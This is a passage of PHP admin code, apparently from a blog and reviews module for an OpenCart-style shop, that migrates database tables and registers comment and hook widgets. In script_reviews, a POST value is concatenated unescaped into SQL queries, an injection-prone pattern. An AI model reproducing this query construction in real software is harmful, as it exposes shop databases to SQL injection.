			$msql = "ALTER TABLE `" . DB_PREFIX . "review_fields` ADD INDEX (`product_id`)";
			$query = $this->db->query($msql);
		}

		$msql = "UPDATE `" . DB_PREFIX . "review_fields` SET `mark`='product_id' WHERE `mark`=''";
		$query = $this->db->query($msql);


		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "comment `sorthex`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD `sorthex` VARCHAR( 255 ) CHARACTER SET ascii COLLATE ascii_bin NOT NULL AFTER `rating`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "rate_comment `rate_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "rate_comment` ADD `rate_id` int(11) AUTO_INCREMENT PRIMARY KEY";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "rate_review `rate_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "rate_review` ADD `rate_id` int(11) AUTO_INCREMENT PRIMARY KEY";
			$query = $this->db->query($msql);
		}


		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "review `sorthex`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD `sorthex` INT(11) NOT NULL AFTER `product_id`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "comment `parent_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD `parent_id` INT(11) NOT NULL AFTER `record_id`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "review `parent_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD `parent_id` INT(11) NOT NULL AFTER `product_id`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "review `rating_mark`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD `rating_mark` tinyint(1)  NOT NULL DEFAULT '0' AFTER `rating`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "record_image `options`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_image` ADD `options` TEXT CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL AFTER `image`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "comment `rating_mark`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD `rating_mark` tinyint(1)  NOT NULL DEFAULT '0' AFTER `rating`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "agoo_signer `pointer`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "agoo_signer` ADD `pointer` varchar(128)  NOT NULL DEFAULT 'product_id' AFTER `id`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "comment `rating_mark`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD INDEX `rating_mark` (`rating_mark`)";
					$query = $this->db->query($msql);
				}
			}
		}

		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "comment `customer_id`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD INDEX `customer_id` (`customer_id`)";
					$query = $this->db->query($msql);
				}
			}
		}

		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "review `customer_id`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '' ) {
					$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD INDEX `customer_id` (`customer_id`)";
					$query = $this->db->query($msql);
				}
			}
		}
		$r = $this->db->query("DESCRIBE  `" . DB_PREFIX . "order` `order_status_id`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "order` ADD INDEX `order_status_id` (`order_status_id`)";
					$query = $this->db->query($msql);
				}
			}
		}

		$r = $this->db->query("DESCRIBE  `" . DB_PREFIX . "order` `customer_id`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "order` ADD INDEX `customer_id` (`customer_id`)";
					$query = $this->db->query($msql);
				}
			}
		}

		$r = $this->db->query("DESCRIBE  `" . DB_PREFIX . "order_product` `order_id`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "order_product` ADD INDEX `order_id` (`order_id`)";
					$query = $this->db->query($msql);
				}
			}
		}

		$r = $this->db->query("DESCRIBE  `" . DB_PREFIX . "order_product` `product_id`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "order_product` ADD INDEX `product_id` (`product_id`)";
					$query = $this->db->query($msql);
				}
			}
		}

		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "review `rating_mark`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == ' ' || $trow['Key'] == '') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD INDEX `rating_mark` (`rating_mark`)";
					$query = $this->db->query($msql);
				}
			}
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "comment `rating`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == '' || $trow['Key'] == ' ') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD INDEX `rating` (`rating`)";
					$query = $this->db->query($msql);
				}
			}
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "review `rating`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == '' || $trow['Key'] == ' ') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD INDEX `rating` (`rating`)";
					$query = $this->db->query($msql);
				}
			}
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "agoo_signer `pointer`");
		if ($r->num_rows == 1) {
			foreach ($r->rows as $trow) {
				if ($trow['Key'] == '' || $trow['Key'] == ' ') {
					$msql = "ALTER TABLE `" . DB_PREFIX . "agoo_signer` ADD INDEX `pointer` (`pointer`)";
					$query = $this->db->query($msql);
				}
			}
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `comment`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` ADD `comment`  text COLLATE utf8_general_ci NOT NULL AFTER `status`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "record `date_end`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` ADD `date_end` DATETIME NOT NULL DEFAULT '2030-11-11 00:00:00' AFTER `date_available`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `date_available`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` CHANGE `date_available` `date_available` DATETIME NOT NULL";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "comment `text`");
		if ($r->num_rows > 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` CHANGE `text` `text` TEXT CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "comment `author`");
		if ($r->num_rows > 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` CHANGE `author` `author` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE  " . DB_PREFIX . "record_description `sdescription`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record_description` ADD `sdescription` text COLLATE utf8_general_ci NOT NULL AFTER `name`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "blog `design`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "blog` ADD `design` text COLLATE utf8_general_ci NOT NULL AFTER `image`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `blog_main`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` ADD `blog_main` INT(11) NOT NULL AFTER `record_id`, ADD INDEX ( `blog_main` ) ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `blog_main`");
		if ($r->num_rows > 0 && $r->row['Type'] == 'tinyint(1)') {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` CHANGE `blog_main` `blog_main` INT(11) NOT NULL";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "blog `customer_group_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "blog` ADD `customer_group_id` INT(2) NOT NULL AFTER `status`";
			$query = $this->db->query($msql);
			$msql = "UPDATE `" . DB_PREFIX . "blog` SET `customer_group_id`=" . (int) $this->config->get('config_customer_group_id') . " ";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `customer_group_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` ADD `customer_group_id` INT(2) NOT NULL AFTER `status`";
			$query = $this->db->query($msql);
			$msql = "UPDATE `" . DB_PREFIX . "record` SET `customer_group_id`=" . (int) $this->config->get('config_customer_group_id') . " ";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE `" . DB_PREFIX . "record` `customer_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` ADD `customer_id` INT(11) NOT NULL DEFAULT '0' AFTER `customer_group_id`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE " . DB_PREFIX . "record `author`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "record` ADD `author`VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '' AFTER `customer_id`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("DESCRIBE `" . DB_PREFIX . "comment` `type_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment` ADD `type_id` INT(11) NOT NULL DEFAULT '1' AFTER `language_id`";
			$query = $this->db->query($msql);
		}
		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "comment` WHERE Key_name ='type_id'");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "comment`  ADD INDEX (`type_id`)";
			$query = $this->db->query($msql);
		}



		$r = $this->db->query("DESCRIBE `" . DB_PREFIX . "review` `type_id`");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review` ADD `type_id` INT(11) NOT NULL DEFAULT '1' AFTER `language_id`";
			$query = $this->db->query($msql);
		}

		$r = $this->db->query("SHOW KEYS FROM `" . DB_PREFIX . "review` WHERE Key_name ='type_id'");
		if ($r->num_rows == 0) {
			$msql = "ALTER TABLE `" . DB_PREFIX . "review`  ADD INDEX (`type_id`)";
			$query = $this->db->query($msql);
		}


/*
		$msql = "SELECT * FROM `" . DB_PREFIX . "blog` LIMIT 1;";
		$query = $this->db->query($msql);
		if (count($query->rows) <= 0) {
			$msql = "INSERT INTO `" . DB_PREFIX . "blog` (`blog_id`, `image`, `parent_id`, `top`, `column`, `sort_order`, `status`, `customer_group_id`, `date_added`, `date_modified`)
			VALUES (1, 'a:12:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_num_records\";s:0:\"\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";}', 0, 0, 0, 1, 1, " . (int) $this->config->get('config_customer_group_id') . ", '2012-10-11 22:58:43', '2012-10-12 01:32:26')
			";
			$query = $this->db->query($msql);
			foreach ($languages as $language) {
				$msql = "INSERT INTO `" . DB_PREFIX . "blog_description` (`blog_id`, `language_id`, `name`, `description`, `meta_description`, `meta_keyword`)
				VALUES (1, " . $language['language_id'] . ", 'News', '', 'News', 'News')";
				$query = $this->db->query($msql);
			}
			$msql = "INSERT INTO `" . DB_PREFIX . "blog_to_store` (`blog_id`, `store_id`) VALUES (1, 0);";
			$query = $this->db->query($msql);
			$msql = "INSERT INTO `" . DB_PREFIX . "url_alias_blog` (`query`, `keyword`) VALUES  ('blog_id=1', 'first_blog')";
			$query = $this->db->query($msql);
		}
		$msql = "SELECT * FROM `" . DB_PREFIX . "record` WHERE `record_id`='1';";
		$query = $this->db->query($msql);
		if (count($query->rows) <= 0) {
			$msql = "INSERT INTO `" . DB_PREFIX . "record` (`record_id`,  `blog_main`, `image`,  `date_available`, `date_end`,  `sort_order`, `status`, `comment`, `comment_status`, `comment_status_reg`, `comment_status_now`, `date_added`, `date_modified`, `viewed`, `customer_group_id`)
				VALUES (1, 1, 'data/logo.png', '2012-10-10 23:58:47', '2030-11-11 00:00:00', 1, 1, 0x613a343a7b733a363a22737461747573223b733a313a2231223b733a31303a227374617475735f726567223b733a313a2230223b733a31303a227374617475735f6e6f77223b733a313a2230223b733a363a22726174696e67223b733a313a2231223b7d, 0, 0, 0, '2012-10-11 22:59:25', '2012-10-12 01:33:59', 2, " . (int) $this->config->get('config_customer_group_id') . ");";
			$query = $this->db->query($msql);
			$msql = "INSERT INTO `" . DB_PREFIX . "record_description` (`record_id`, `language_id`, `name`, `description`, `meta_description`, `meta_keyword`) VALUES (1, 1, 'We started a blog.', 0x266c743b702667743b0d0a09266c743b7370616e20636c6173733d2671756f743b73686f72745f746578742671756f743b2069643d2671756f743b726573756c745f626f782671756f743b206c616e673d2671756f743b656e2671756f743b20746162696e6465783d2671756f743b2d312671756f743b2667743b266c743b7370616e20636c6173733d2671756f743b6870732671756f743b2667743b57652073746172746564266c743b2f7370616e2667743b20266c743b7370616e20636c6173733d2671756f743b6870732671756f743b2667743b6120626c6f672e266c743b2f7370616e2667743b266c743b2f7370616e2667743b266c743b2f702667743b0d0a, 'We started a blog.', 'We started a blog.');";
			$query = $this->db->query($msql);
			$msql = "INSERT INTO `" . DB_PREFIX . "record_to_blog` (`record_id`, `blog_id`) VALUES (1, 1);";
			$query = $this->db->query($msql);
			$msql = "INSERT INTO `" . DB_PREFIX . "record_to_store` (`record_id`, `store_id`) VALUES (1, 0);";
			$query = $this->db->query($msql);
			$msql = "INSERT INTO `" . DB_PREFIX . "url_alias_blog` (`query`, `keyword`) VALUES  ('record_id=1', 'first_record')";
			$query = $this->db->query($msql);
		}
		$msql = "SELECT * FROM `" . DB_PREFIX . "url_alias` WHERE `query` LIKE 'blog_id=%';";
		$query = $this->db->query($msql);
		if (count($query->rows) > 0) {
			foreach ($query->rows as $blog_id) {
				$msql = "SELECT * FROM `" . DB_PREFIX . "url_alias_blog` WHERE `query`='" . $blog_id['query'] . "'";
				$query_1 = $this->db->query($msql);
				if (count($query_1->rows) <= 0) {
					$msql = "INSERT INTO `" . DB_PREFIX . "url_alias_blog` (`query`, `keyword`) VALUES  ('" . $blog_id['query'] . "', '" . $blog_id['keyword'] . "')";
					$query_2 = $this->db->query($msql);
				}
				$msql = "DELETE FROM `" . DB_PREFIX . "url_alias` WHERE query ='" . $blog_id['query'] . "'";
				$query_3 = $this->db->query($msql);
			}
		}
		$msql = "SELECT * FROM `" . DB_PREFIX . "url_alias` WHERE `query` LIKE 'record_id=%';";
		$query = $this->db->query($msql);
		if (count($query->rows) > 0) {
			foreach ($query->rows as $blog_id) {
				$msql = "SELECT * FROM `" . DB_PREFIX . "url_alias_blog` WHERE `query`='" . $blog_id['query'] . "'";
				$query_1 = $this->db->query($msql);
				if (count($query_1->rows) <= 0) {
					$msql = "INSERT INTO `" . DB_PREFIX . "url_alias_blog` (`query`, `keyword`) VALUES  ('" . $blog_id['query'] . "', '" . $blog_id['keyword'] . "')";
					$query_2 = $this->db->query($msql);
				}
				$msql = "DELETE FROM `" . DB_PREFIX . "url_alias` WHERE query ='" . $blog_id['query'] . "'";
				$query_3 = $this->db->query($msql);
			}
		}

*/


        $this->script_hook();
        $this->script_reviews();

		$this->cache->delete('blog');
		$this->cache->delete('ajax');
		$this->cache->delete('html');
		$this->cache->delete('record');
		$this->cache->delete('blog.module.view');
		$this->cache->delete('blogsrecord');
		$this->cache->delete('category');
		$this->cache->delete('product');
		$this->cache->delete('html');
		$this->language->load('catalog/blog');
		$html .= $this->language->get('ok_create_tables');
		$this->response->setOutput($html);
	}



	private function layout_module($route ='error/not_found', $name = 'not_found') {
		$this->language->load('module/blog');
		if (!isset($not_found_id)) {

				$msql = "SELECT * FROM `" . DB_PREFIX . "layout_route` WHERE `route`='".$route."';";
				$query = $this->db->query($msql);

				if (count($query->rows) <= 0) {

					$msql = "SELECT * FROM `" . DB_PREFIX . "layout` WHERE name = '" . $name  . "' LIMIT 1;";
					$query = $this->db->query($msql);
					if (count($query->rows) <= 0) {
						$msql = "INSERT INTO `" . DB_PREFIX . "layout` (`name`) VALUES  ('" . $name  . "');";
						$query = $this->db->query($msql);
						$not_found_id = $this->db->getLastId();
                    } else {
                    	$not_found_id =$query->row['layout_id'];
                    }

					$msql = "INSERT INTO `" . DB_PREFIX . "layout_route` (`route`, `layout_id`) VALUES  ('".$route."'," . $not_found_id . ");";
					$query = $this->db->query($msql);
				} else {
					$not_found_id = $query->row['layout_id'];
				}

		}
        return $not_found_id;
	}


	private function get_layout_id_by_route($route) {
		if (!isset($found_layout_id)) {

				$msql = "SELECT * FROM `" . DB_PREFIX . "layout_route` WHERE `route`='".$route."';";
				$query = $this->db->query($msql);

				if (count($query->rows) <= 0) {
                   return false;
				} else {
					$found_layout_id = $query->row['layout_id'];
				}

		}
        return $found_layout_id;
	}

	private function get_layout_name_by_route($route) {
		if (!isset($found_layout_name)) {

				$msql = "SELECT * FROM `" . DB_PREFIX . "layout_route` lr
				LEFT JOIN `" . DB_PREFIX . "layout` l ON (lr.layout_id = l.layout_id)
				WHERE lr.route='".$route."';";
				$query = $this->db->query($msql);

				if (count($query->rows) <= 0) {
                   return false;
				} else {
					$found_layout_name = $query->row['name'];
				}

		}
        return $found_layout_name;
	}


	public function script_reviews($layout_route = 'record/record')
	{
      if ($this->validate()) {
       $post = false;
		if ($this->request->server['REQUEST_METHOD'] == 'POST' && $this->validate()) {
			if (isset($this->request->post['layout_route'])) {
				$layout_route = $this->request->post['layout_route'];
				$post = true;
			}
		}

      	$layout_id = $this->get_layout_id_by_route($layout_route);
      	$layout_name = $this->get_layout_name_by_route($layout_route);
       	$this->language->load('module/blog');
        $this->load->model('localisation/language');
        $this->load->model('setting/store');
        $this->load->model('setting/setting');

		$languages = $this->model_localisation_language->getLanguages();
		$stores = $this->model_setting_store->getStores();

		$store_info = $this->model_setting_setting->getSetting('config', 0);
        if (isset($store_info['config_email'])) {
        	$this->data['config_email'] = $store_info['config_email'];
        } else {
          	$this->data['config_email'] = '';
        }

		$ascp_widgets        = $this->model_setting_setting->getSetting('ascp_widgets');
  		if (isset( $ascp_widgets['ascp_widgets'])) {
		 $this->data['ascp_widgets'] = $ascp_widgets['ascp_widgets'];
		} else {
		 $this->data['ascp_widgets'] = Array();
		}
        if ($this->data['ascp_widgets'] == false) {
	        $this->data['ascp_widgets'] = Array();
        }


         $found= false;
         $found_double = false;
         $found_hook = array();

         if (!is_array($this->data['ascp_widgets'])) {
	         $this->data['ascp_widgets'] = array();
         }

         foreach ($this->data['ascp_widgets'] as $num => $val) {

			foreach ($languages as $language) {

				  //$title_list_latest = $this->language->get('text_reviews_for_module').$layout_name;
				  $title_list_latest = $this->language->get('text_reviews_for_module');
		          if (isset($val['title_list_latest']) && $val['title_list_latest'][$language['language_id']]==$title_list_latest) {
		           $id_new = $found_hook[$num] = $num;
		           $found_double= true;
		           $found= true;
		          }
			}

		          if (isset($val['type']) && $val['type']=='treecomments' && !$post) {
	    	       $id_new = $found_hook[$num] = $num;
	    	       $found_double= true;
	    	       $found= true;
	        	  }


         }

$anchor=<<<EOF
$('#cmswidget-'+cmswidget).remove();
tabs = $('.nav-tabs').children().length;
data = $(data).html();
$('.nav-tabs').append('<li><a data-toggle=\'tab\' href=\'#tab-html-'+cmswidget+'\'>'+heading_title+'</a></li>');
$('.tab-content:first').append($(data).html());
if (tabs == 0 || $('.nav-tabs').children().filter('.active').length == 0) $('a[href$=\'#tab-html-'+cmswidget+'\']').click();
EOF;


$box_begin=<<<EOF
<div id="tab-html-{CMSWIDGET}" class="tab-pane">
	<div class="box" style="display: block">
		<div class="box-content bordernone">
EOF;

$box_end=<<<EOF
		</div>
	</div>
</div>
EOF;


         if (!$found || $post) {
         if(!$found_double) {
		  $ar = Array(
		   'remove' => '',
           'type' => 'treecomments',
            'template' => '',
            'blog_template_comment' => '',
            'langfile' => '',
            'anchor' => $anchor,
            'cached' => '1',
            'number_comments' => '20',
            'status' => '1',
            'status_reg' => '0',
            'status_now' => '1',
            'karma' => '1',
            'karma_reg' => '0',
            'rating_num' => '',
            'avatar_status' => '1',
            'avatar_width' => '50',
            'avatar_height' => '50',
            'buyer_status' => '1',
            'comments_email' => $this->data['config_email'],
            'admin_name' => 'admin',
            'admin_color' => '#fafafa',
            'order' => 'sort',
            'order_ad' => 'desc',
            'comment_must' => '1',
            'rating' => '1',
            'rating_must' => '0',
            'visual_rating' => '1',
            'fields_view' => '1',
            'view_captcha' => '1',
            'signer' => '1',
            'visual_editor' => '1',
            'bbwidth' => '160',
            'record' => '',
            'recordid' => '',
            'handler' => '',
            'box_begin' => $box_begin,
            'box_end' => $box_end,
            'doc_ready' => '1',
            'ajax' => '0',
            'reserved' => '',
           'store' => Array ('0' => '0'),
           'customer_groups' => Array
                (
                    '0' =>  $this->config->get('config_customer_group_id'),
                    '1' => '-1',
                    '2' => '-2',
                    '3' => '-3'
                )
        	);


		foreach ($stores as $num => $store) {
		 $ar['store'][] = $store['store_id'];
		}

		foreach ($languages as $language) {
			//$title_list_latest = $this->language->get('text_reviews_for_module').$layout_name;
			$title_list_latest = $this->language->get('text_reviews_for_module');
			$ar['title_list_latest'][$language['language_id']] = $title_list_latest;
		}

       	 $ascp_widgets['ascp_widgets'] = $this->data['ascp_widgets'];

      	 $id_new = 1;

	      	 foreach($ascp_widgets['ascp_widgets'] as $id => $massa) {
	           if ($id_new!=$id) {
	             if (!isset($ascp_widgets['ascp_widgets'][$id_new])) {
	                break;
	             }
	           }
	           $id_new++;
	      	 }

          $ascp_widgets['ascp_widgets'][$id_new] = $ar;

       	  $this->model_setting_setting->editSetting('ascp_widgets', $ascp_widgets);
        }
       }


		$blog_module        = $this->model_setting_setting->getSetting('blog_module');
        if (isset($blog_module['blog_module'])) {
		 $this->data['blog_module'] = $blog_module['blog_module'];
		} else {
		 $this->data['blog_module']  = Array();
		}
        if ($this->data['blog_module'] == false) {
	        $this->data['blog_module'] = Array();
        }


		$ascp_widgets        = $this->model_setting_setting->getSetting('ascp_widgets');
        if (isset($ascp_widgets['ascp_widgets'])) {
		 $this->data['ascp_widgets'] = $ascp_widgets['ascp_widgets'];
		} else {
		 $this->data['ascp_widgets']  = Array();
		}
        if ($this->data['ascp_widgets'] == false) {
	        $this->data['ascp_widgets'] = Array();
        }

         $found_hook= Array();
         foreach ($this->data['ascp_widgets'] as $num => $val) {
          if (isset($val['type']) && $val['type']=='treecomments') {
           $found_hook[$num] = $num;
          }
         }

         if ($post) $found_hook[$id_new] = $id_new;

         $found= false;
         $found_scheme = '';
         foreach ($this->data['blog_module'] as $num => $val) {
          if (isset($val['what']) && isset($found_hook[$val['what']])) {

          foreach ($val['layout_id'] as $number => $lay_id ) {
           	if ($lay_id == $layout_id) {
           		$found= true;
           		$found_scheme = $num;
           	}
           }
          }
         }



        $ar = Array();
        if (!$found && !empty($found_hook)) {
           $ar = Array(
		   'url_template' => '0',
           'url' => '',
           'position' => 'content_bottom',
           'status' => '1',
           'sort_order' => '0',
           'what' => $found_hook[$id_new],
           'layout_id' => Array('0'=> $layout_id)
        	);

       	 $blog_module['blog_module'] = $this->data['blog_module'];

      	 $id_new = 1;
      	 foreach($blog_module['blog_module'] as $id => $massa) {
	             if (!isset($blog_module['blog_module'][$id_new])) {
	                break;
	             }
           $id_new++;
      	 }

         $blog_module['blog_module'][$id_new] = $ar;

       	 $this->model_setting_setting->editSetting('blog_module', $blog_module);
        }



      if ($this->request->server['REQUEST_METHOD'] == 'POST' && $this->validate()) {
   			$html = $this->language->get('ok_create_tables');
			$this->response->setOutput($html);
		}
	 }
	}


	private function script_hook()
	{
        $this->language->load('module/blog');
        $this->load->model('localisation/language');
        $this->load->model('setting/store');
        $this->load->model('setting/setting');

		$languages = $this->model_localisation_language->getLanguages();
		$stores = $this->model_setting_store->getStores();

        $not_found_id = $this->layout_module('error/not_found', $this->language->get('text_not_found'));

		$ascp_widgets        = $this->model_setting_setting->getSetting('ascp_widgets');

		if (!is_array($ascp_widgets)) {
			unset($ascp_widgets);
		}

        if (isset($ascp_widgets['ascp_widgets'])) {
        	$this->data['ascp_widgets'] = $ascp_widgets['ascp_widgets'];
        } else {
        	$this->data['ascp_widgets'] = Array();
        }

        if ($this->data['ascp_widgets'] == false) {
	        $this->data['ascp_widgets'] = Array();
        }

         $found= false;
         foreach ($this->data['ascp_widgets'] as $num => $val) {
          if (isset($val['type']) && $val['type']=='hook') {
           $found= true;
          break;
          }
         }

         if (!$found) {
		  $ar = Array(
		   'remove' => '',
           'type' => 'hook',
           'store' => Array ('0' => '0'),
           'customer_groups' => Array
                (
                    '0' =>  $this->config->get('config_customer_group_id'),
                    '1' => '-1',
                    '2' => '-2',
                    '3' => '-3'
                )
        	);

		foreach ($stores as $num => $store) {
		 $ar['store'][] = $store['store_id'];
		}

		foreach ($languages as $language) {
			$title_list_latest = $this->language->get('text_url_for_module');
			$ar['title_list_latest'][$language['language_id']] = $title_list_latest;
		}

       	 $ascp_widgets['ascp_widgets'] = $this->data['ascp_widgets'];

      	 $id_new = 1;
      	 foreach($ascp_widgets['ascp_widgets'] as $id => $massa) {
	       if (!isset($ascp_widgets['ascp_widgets'][$id_new])) {
	          break;
	       }
           $id_new++;
      	 }

         $ascp_widgets['ascp_widgets'][$id_new] = $ar;

       	 $this->model_setting_setting->editSetting('ascp_widgets', $ascp_widgets);
        }


		$blog_module        = $this->model_setting_setting->getSetting('blog_module');

        if (isset($blog_module['blog_module'])) {
         $this->data['blog_module'] = $blog_module['blog_module'];
        } else {
         $this->data['blog_module'] = Array();
        }

        if ($this->data['blog_module'] == false) {
	        $this->data['blog_module'] = Array();
        }

		$ascp_widgets        = $this->model_setting_setting->getSetting('ascp_widgets');
        if (isset($ascp_widgets['ascp_widgets'])) {
          $this->data['ascp_widgets'] = $ascp_widgets['ascp_widgets'];
        } else {
          $this->data['ascp_widgets'] = Array();
        }

        if ($this->data['ascp_widgets'] == false) {
	        $this->data['ascp_widgets'] = Array();
        }

         $found_hook= '';
         foreach ($this->data['ascp_widgets'] as $num => $val) {
          if (isset($val['type']) && $val['type']=='hook') {
           $found_hook = $num;
          break;
          }
         }

         $found= false;
         $found_scheme = '';
         foreach ($this->data['blog_module'] as $num => $val) {
          if (isset($val['what']) && $val['what']== $found_hook) {
           $found= true;
           $found_scheme = $num;
          break;
          }
         }

        $ar = Array();
        if (!$found && $found_hook!='') {
           $ar = Array(
		   'url_template' => '0',
           'url' => '',
           'position' => 'content_top',
           'status' => '1',
           'sort_order' => '0',
           'what' => $found_hook,
           'layout_id' => Array('0'=> $not_found_id)
        	);

       	 $blog_module['blog_module'] = $this->data['blog_module'];

      	 $id_new = 1;
      	 foreach($blog_module['blog_module'] as $id => $massa) {
	             if (!isset($blog_module['blog_module'][$id_new])) {
	                break;
	             }
           $id_new++;
      	 }

         $blog_module['blog_module'][$id_new] = $ar;

       	 $this->model_setting_setting->editSetting('blog_module', $blog_module);
        }

	}


  	public function deletecache($key) {
		$files = glob(DIR_CACHE . preg_replace('/[^A-Z0-9\._-]/i', '', $key) . '.*');

		if ($files) {
    		foreach ($files as $file) {
      			if (file_exists($file)) {
					unlink($file);
				}
    		}
		}
  	}


/***************************************/
	private function isAva($func)
	{
		$this->language->load('module/blog');
